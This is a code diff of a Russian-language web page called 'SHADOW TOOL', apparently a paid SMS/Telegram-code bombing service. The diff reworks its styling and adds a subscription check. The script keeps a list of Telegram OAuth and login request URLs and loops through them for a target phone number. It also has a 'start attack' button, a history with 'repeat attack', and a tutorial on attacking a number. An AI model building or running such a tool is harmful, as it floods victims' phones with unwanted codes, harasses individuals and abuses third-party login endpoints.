@@ -29,6 +29,7 @@
             color: var(--secondary-color);
             font-family: 'Roboto', sans-serif;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .star-field {
@@ -50,17 +51,6 @@
         .star.small { animation: twinkle 5s infinite alternate; }
         @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
 
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: -1;
-            pointer-events: none;
-        }
-
         @keyframes colorPulse {
             0%, 100% { color: #ffffff; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
             50% { color: #e0e0e0; text-shadow: 0 0 20px rgba(255,255,255,0.7); }
@@ -69,6 +59,11 @@
         @keyframes blackWhiteFlow {
             0%, 100% { color: #ffffff; border-color: #ffffff; }
             50% { color: #999999; border-color: #999999; }
+        }
+
+        @keyframes subtleFlow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
 
         .glitch-container { text-align: center; margin: 2em 0; }
@@ -80,13 +75,12 @@
             text-transform: uppercase;
         }
         @keyframes textFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
-        .glitch-container .author {
+        .author {
             color: #ffffff;
             font-size: 1.1em;
             margin-top: 10px;
             animation: subtleFlow 5s ease-in-out infinite;
         }
-        @keyframes subtleFlow { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
 
         .tabs {
             display: flex;
@@ -105,6 +99,7 @@
             text-transform: uppercase;
             font-weight: 500;
             animation: blackWhiteFlow 8s ease-in-out infinite;
+            border-radius: 0;
         }
         .tab-btn.active { background: var(--border-color); color: #000000; animation: none; }
         .tab-content { display: none; animation: fadeIn 0.5s; }
@@ -116,7 +111,9 @@
             border: 1px solid var(--border-color);
             padding: 20px;
             background: rgba(0, 0, 0, 0.85);
+            position: relative;
         }
+
         input[type="text"], input[type="password"] {
             background: #000000;
             border: 1px solid var(--border-color);
@@ -128,7 +125,8 @@
             font-size: 1.1em;
             display: block;
         }
-        button, .button {
+
+        button {
             background: #000000;
             border: 1px solid var(--border-color);
             color: var(--border-color);
@@ -138,10 +136,10 @@
             font-weight: 500;
             margin: 10px 5px;
             animation: blackWhiteFlow 9s ease-in-out infinite;
+            border-radius: 0;
         }
-        button:hover, .button:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); animation: none; }
+        button:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); animation: none; }
         .button-container { display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
-        .input-container { display: flex; justify-content: center; width: 100%; }
 
         .logs {
             height: 250px;
@@ -152,12 +150,12 @@
             background: rgba(0, 0, 0, 0.5);
         }
         .log-item {
-            padding: 10px;
+            padding: 8px 12px;
             margin: 8px 0;
             border-left: 2px solid var(--border-color);
             background: rgba(255,255,255,0.05);
             font-family: 'Roboto Mono', monospace;
-            font-size: 0.9em;
+            font-size: 0.85em;
         }
 
         .status {
@@ -168,7 +166,10 @@
             background: rgba(0,0,0,0.85);
             border: 1px solid var(--border-color);
             cursor: pointer;
+            font-size: 12px;
+            animation: statusPulse 3s ease-in-out infinite;
         }
+        @keyframes statusPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
 
         .auth-overlay {
             position: fixed;
@@ -176,7 +177,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.95);
+            background: rgba(0,0,0,0.98);
+            backdrop-filter: blur(10px);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -185,7 +187,7 @@
         .auth-box {
             background: #000;
             border: 2px solid #fff;
-            padding: 30px;
+            padding: 40px 30px;
             width: 90%;
             max-width: 380px;
             text-align: center;
@@ -198,10 +200,13 @@
             border: 1px solid #fff;
             color: #fff;
         }
+        .auth-box button {
+            width: 100%;
+            margin-top: 15px;
+        }
         .error-msg { color: #ff5555; margin-top: 10px; font-size: 12px; }
 
         .main-content { display: none; }
-        .main-content.show { display: block; }
 
         .history-content, .tutorial-content, .admins-content {
             max-width: 1000px;
@@ -212,9 +217,26 @@
         }
         .history-table { width: 100%; border-collapse: collapse; }
         .history-table th, .history-table td { padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.2); text-align: left; }
-        .stat-card { flex: 1; min-width: 150px; padding: 15px; border: 1px solid #fff; text-align: center; margin: 10px; }
+        .history-table th { text-transform: uppercase; font-size: 12px; letter-spacing: 1px; }
+        .stat-card { flex: 1; min-width: 150px; padding: 15px; border: 1px solid #fff; text-align: center; margin: 10px; background: rgba(0,0,0,0.5); }
         .stat-value { font-size: 2em; font-weight: bold; }
-        .history-stats { display: flex; justify-content: center; flex-wrap: wrap; }
+        .history-stats { display: flex; justify-content: center; flex-wrap: wrap; margin-bottom: 20px; }
+        .history-controls { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .action-btn { padding: 5px 10px; margin: 0 2px; font-size: 12px; }
+        .tutorial-step { margin: 20px 0; padding: 15px; border-left: 2px solid #fff; background: rgba(255,255,255,0.05); }
+        .admin-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: rgba(255,255,255,0.05);
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .admin-item:hover { background: rgba(255,255,255,0.1); }
+        .admin-item-name { font-size: 1.2em; font-weight: bold; }
+        .admin-item-role { font-size: 0.8em; color: #aaa; }
+        .status-active { color: #4CAF50; }
 
         @media (max-width: 768px) {
             .glitch { font-size: 1.8em; }
@@ -224,12 +246,11 @@
     </style>
 </head>
 <body>
-    <div class="overlay"></div>
     <div class="star-field" id="starField"></div>
 
     <div class="auth-overlay" id="authOverlay">
         <div class="auth-box">
-            <h2>🔐 ВХОД</h2>
+            <h2>🔐 SHADOW TOOL</h2>
             <div id="loginForm">
                 <input type="text" id="loginLogin" placeholder="Логин">
                 <input type="password" id="loginPassword" placeholder="Пароль">
@@ -265,7 +286,7 @@
                     <input type="text" id="phone" placeholder="Введите номер телефона!">
                 </div>
                 <div class="button-container">
-                    <button onclick="startAttack()">Начать</button>
+                    <button onclick="startAttack()">Начать атаку</button>
                 </div>
                 <div class="logs" id="logs"></div>
             </div>
@@ -273,15 +294,18 @@
 
         <div id="tutorialTab" class="tab-content">
             <div class="tutorial-content">
-                <h2 style="text-align:center">ТУТОРИАЛ</h2>
+                <h2 style="text-align:center">📖 ТУТОРИАЛ</h2>
                 <div class="tutorial-step">
-                    <h3>ШАГ 1: Подписка</h3>
-                    <p>Подпишитесь на Telegram канал для доступа</p>
-                    <a href="https://t.me/fallsfack" target="_blank">ПОДПИСАТЬСЯ</a>
+                    <h3>ШАГ 1: Авторизация</h3>
+                    <p>Зарегистрируйтесь или войдите в аккаунт</p>
                 </div>
                 <div class="tutorial-step">
-                    <h3>ШАГ 2: Использование</h3>
-                    <p>Введите номер телефона и нажмите "Начать"</p>
+                    <h3>ШАГ 2: Атака</h3>
+                    <p>Введите номер телефона в формате +79001234567 и нажмите "Начать атаку"</p>
+                </div>
+                <div class="tutorial-step">
+                    <h3>ШАГ 3: Подписка</h3>
+                    <p>Для доступа к инструменту необходима подписка. Администратор выдаёт её в Telegram боте</p>
                 </div>
             </div>
         </div>
@@ -299,7 +323,7 @@
                 <div class="history-table-container">
                     <table class="history-table">
                         <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th>Действия</th></tr></thead>
-                        <tbody id="historyTableBody"></tbody>
+                        <tbody id="historyTableBody"><tr><td colspan="4">История атак пуста</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -307,10 +331,8 @@
 
         <div id="adminsTab" class="tab-content">
             <div class="admins-content">
-                <div class="admins-header">
-                    <div class="admins-title">КОМАНДА</div>
-                </div>
-                <div class="admins-list" id="adminsList"></div>
+                <h2 style="text-align:center">👥 КОМАНДА</h2>
+                <div id="adminsList"></div>
             </div>
         </div>
 
@@ -321,10 +343,8 @@
         // ========== НАСТРОЙКИ ==========
         const API_BASE = 'https://use-production-88cf.up.railway.app';
         
-        // Белый список (защита номеров)
         const WHITELIST_GIST_URL = 'https://gist.githubusercontent.com/shadowtool1/af1959fc4b147c2ddc549c862d63cd9b/raw/whitelist.json';
         
-        // Список URL для атаки
         const URLs = [
             'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
             'https://translations.telegram.org/auth/request',
@@ -338,9 +358,23 @@
             'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
         ];
 
-        // Глобальные переменные
         let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
-        let isAdminAuth = false;
+        let currentUser = null;
+
+        // ========== ЗВЁЗДЫ ==========
+        function createStars() {
+            const starField = document.getElementById('starField');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star ' + (Math.random() > 0.7 ? 'big' : (Math.random() > 0.4 ? 'medium' : 'small'));
+                star.style.width = Math.random() > 0.7 ? '2px' : '1px';
+                star.style.height = star.style.width;
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                starField.appendChild(star);
+            }
+        }
 
         // ========== БЕЛЫЙ СПИСОК ==========
         async function isPhoneWhitelisted(phone) {
@@ -358,18 +392,24 @@
                 const data = await res.json();
                 return data.blocked === true;
             } catch(e) {
-                // Если бэкенд не отвечает, проверяем через Gist напрямую
-                try {
-                    const gistRes = await fetch(WHITELIST_GIST_URL + '?t=' + Date.now());
-                    const gistData = await gistRes.json();
-                    let clean = phone.replace(/[^0-9]/g, '');
-                    if (clean.startsWith('8')) clean = '7' + clean.slice(1);
-                    if (!clean.startsWith('7')) clean = '7' + clean;
-                    const normalized = '+' + clean;
-                    return gistData.phones?.some(p => p.number === normalized) || false;
-                } catch(e2) {
-                    return false;
-                }
+                return false;
+            }
+        }
+
+        // ========== ПРОВЕРКА ПОДПИСКИ ==========
+        async function checkSubscription() {
+            const token = localStorage.getItem('token');
+            if (!token) return false;
+            
+            try {
+                const res = await fetch(API_BASE + '/check_subscription', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                const data = await res.json();
+                return data.has_access === true;
+            } catch(e) {
+                console.error('Subscription check error:', e);
+                return false;
             }
         }
 
@@ -387,7 +427,8 @@
             
             if (data.success) {
                 localStorage.setItem('token', data.token);
-                checkAuth();
+                currentUser = data.login;
+                await checkAuth();
             } else {
                 document.getElementById('authError').innerText = '❌ ' + data.error;
             }
@@ -406,7 +447,8 @@
             
             if (data.success) {
                 localStorage.setItem('token', data.token);
-                checkAuth();
+                currentUser = data.login;
+                await checkAuth();
             } else {
                 document.getElementById('authError').innerText = '❌ ' + data.error;
             }
@@ -415,8 +457,7 @@
         async function checkAuth() {
             const token = localStorage.getItem('token');
             if (!token) {
-                document.getElementById('authOverlay').style.display = 'flex';
-                document.getElementById('mainContent').style.display = 'none';
+                showAuthScreen();
                 return false;
             }
             
@@ -425,22 +466,42 @@
                     headers: { 'Authorization': 'Bearer ' + token }
                 });
                 if (res.ok) {
-                    document.getElementById('authOverlay').style.display = 'none';
-                    document.getElementById('mainContent').style.display = 'block';
-                    document.getElementById('mainContent').classList.add('show');
-                    loadTeamData();
-                    updateHistoryDisplay();
-                    return true;
+                    const data = await res.json();
+                    currentUser = data.login;
+                    
+                    // Проверяем подписку
+                    const hasAccess = await checkSubscription();
+                    if (hasAccess) {
+                        showApp();
+                        loadTeamData();
+                        updateHistoryDisplay();
+                        return true;
+                    } else {
+                        alert('❌ У вас нет активной подписки! Обратитесь к администратору в Telegram боте.');
+                        localStorage.removeItem('token');
+                        showAuthScreen();
+                        return false;
+                    }
                 } else {
                     localStorage.removeItem('token');
-                    document.getElementById('authOverlay').style.display = 'flex';
-                    document.getElementById('mainContent').style.display = 'none';
+                    showAuthScreen();
                     return false;
                 }
             } catch(e) {
                 console.error('Auth error:', e);
+                showAuthScreen();
                 return false;
             }
+        }
+
+        function showAuthScreen() {
+            document.getElementById('authOverlay').style.display = 'flex';
+            document.getElementById('mainContent').style.display = 'none';
+        }
+
+        function showApp() {
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
         }
 
         function showRegister() {
@@ -490,7 +551,7 @@
                     successCount++;
                     addLog(`✅ Запрос ${i+1}/${URLs.length} отправлен`);
                 } catch(e) {
-                    addLog(`⚠️ Запрос ${i+1}/${URLs.length}: ошибка (игнорируем)`);
+                    addLog(`⚠️ Запрос ${i+1}/${URLs.length}: ошибка`);
                 }
                 await new Promise(r => setTimeout(r, 100));
             }
@@ -547,8 +608,11 @@
                 <tr>
                     <td>${new Date(attack.timestamp).toLocaleTimeString()}</td>
                     <td>${attack.phone}</td>
-                    <td><span style="color: #4CAF50;">✅ Успешно</span></td>
-                    <td><button onclick="repeatAttack('${attack.phone}')">↺</button> <button onclick="deleteAttack(${attack.id})">🗑️</button></td>
+                    <td style="color: #4CAF50;">✅ Успешно</td>
+                    <td>
+                        <button class="action-btn" onclick="repeatAttack('${attack.phone}')">↺</button>
+                        <button class="action-btn" onclick="deleteAttack(${attack.id})">🗑️</button>
+                    </td>
                 </tr>
             `).join('');
         }
@@ -579,9 +643,9 @@
                 alert('Нет данных для экспорта');
                 return;
             }
-            const csv = [['Время', 'Номер', 'Статус', 'Запросы', 'Успешных', 'Длительность']];
+            const csv = [['Время', 'Номер', 'Статус', 'Запросы', 'Успешных']];
             attackHistory.forEach(a => {
-                csv.push([new Date(a.timestamp).toLocaleString(), a.phone, a.status, a.requests, a.successful, a.duration + 'ms']);
+                csv.push([new Date(a.timestamp).toLocaleString(), a.phone, a.status, a.requests, a.successful]);
             });
             const blob = new Blob(['\ufeff' + csv.map(row => row.join(',')).join('\n')], { type: 'text/csv;charset=utf-8' });
             const url = URL.createObjectURL(blob);
@@ -615,20 +679,6 @@
             document.getElementById(tabName + 'Tab').classList.add('active');
             event.target.classList.add('active');
             if (tabName === 'history') updateHistoryDisplay();
-        }
-
-        function createStars() {
-            const starField = document.getElementById('starField');
-            for (let i = 0; i < 100; i++) {
-                const star = document.createElement('div');
-                star.className = 'star ' + (Math.random() > 0.7 ? 'big' : (Math.random() > 0.4 ? 'medium' : 'small'));
-                star.style.width = Math.random() > 0.7 ? '2px' : '1px';
-                star.style.height = star.style.width;
-                star.style.left = Math.random() * 100 + '%';
-                star.style.top = Math.random() * 100 + '%';
-                star.style.animationDelay = Math.random() * 5 + 's';
-                starField.appendChild(star);
-            }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
